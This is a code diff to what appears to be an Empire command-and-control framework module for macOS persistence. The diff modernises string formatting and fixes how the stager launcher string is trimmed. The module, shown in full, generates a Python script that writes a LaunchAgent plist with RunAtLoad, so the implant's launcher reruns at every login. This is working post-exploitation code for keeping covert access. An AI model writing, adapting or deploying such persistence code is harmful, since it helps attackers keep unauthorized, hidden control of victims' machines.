@@ -1,10 +1,10 @@
-from builtins import object
 from typing import Dict, Optional, Tuple
 
 from empire.server.core.module_models import EmpireModule
+from empire.server.utils.string_util import removeprefix, removesuffix
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -23,43 +23,45 @@ class Module(object):
             userAgent=user_agent,
             safeChecks=safe_checks,
         )
-        launcher = launcher.strip("echo").strip(" | python3 &").strip('"')
+        launcher = removeprefix(launcher, "echo ")
+        launcher = removesuffix(launcher, " | python3 &")
+        launcher = launcher.strip('"')
 
         plistSettings = """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
 <key>Label</key>
-<string>%s</string>
+<string>{}</string>
 <key>ProgramArguments</key>
 <array>
 <string>python</string>
 <string>-c</string>
-<string>%s</string>
+<string>{}</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
 </dict>
 </plist>
-""" % (
+""".format(
             plist_name,
             launcher,
         )
 
-        script = """
+        script = f"""
 import subprocess
 import sys
 import base64
 import os
 
 
-plistPath = "/Library/LaunchAgents/%s"
+plistPath = "/Library/LaunchAgents/{plist_name}"
 
 if not os.path.exists(os.path.split(plistPath)[0]):
     os.makedirs(os.path.split(plistPath)[0])
 
 plist = \"\"\"
-%s
+{plistSettings}
 \"\"\"
 
 homedir = os.getenv("HOME")
@@ -73,12 +75,8 @@ e.close()
 os.chmod(plistPath, 0644)
 
 
-print("\\n[+] Persistence has been installed: /Library/LaunchAgents/%s")
+print("\\n[+] Persistence has been installed: /Library/LaunchAgents/{plist_name}")
 
-""" % (
-            plist_name,
-            plistSettings,
-            plist_name,
-        )
+"""
 
         return script
